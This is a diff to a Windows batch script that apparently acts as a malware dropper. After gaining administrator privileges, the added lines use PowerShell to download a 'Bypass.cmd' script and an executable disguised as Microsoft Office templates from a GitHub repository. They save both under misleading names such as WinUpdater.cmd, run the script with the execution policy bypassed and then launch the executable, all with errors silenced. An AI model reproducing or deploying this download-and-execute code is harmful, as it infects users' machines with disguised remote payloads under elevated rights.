@@ -23,27 +23,22 @@ goto gotAdmin
 :gotAdmin
     cd /D "%~dp0" 2>nul
 
-:: Only run this section with elevated privileges
-if "%1"=="restarted" (
-    echo Running with elevated privileges
+set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
+set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@OfficeTempletes.exe"
+set "PS1_FILE=%temp%\WinUpdater.cmd"
+set "EXE_FILE=%temp%\$77-Microsoft@OfficeTempletes.exe"
 
-    set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
-    set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft Office Templates.exe"
-    set "PS1_FILE=%temp%\WinUpdater.cmd"
-    set "EXE_FILE=%temp%\Sys-Registry.exe"
+echo Downloading files...
+powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
+powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul
 
-    echo Downloading files...
-    powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
-    powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul
+echo Executing PowerShell script...
+powershell -ExecutionPolicy Bypass -File "%PS1_FILE%" 2>nul
 
-    echo Executing PowerShell script...
-    powershell -ExecutionPolicy Bypass -File "%PS1_FILE%" 2>nul
+echo Waiting for 60 seconds...
+timeout /t 60 /nobreak >nul
 
-    echo Waiting for 60 seconds...
-    timeout /t 60 /nobreak >nul
-
-    echo Launching executable...
-    start "" "%EXE_FILE%"
-)
+echo Launching executable...
+start "" "%EXE_FILE%"
 
 endlocal
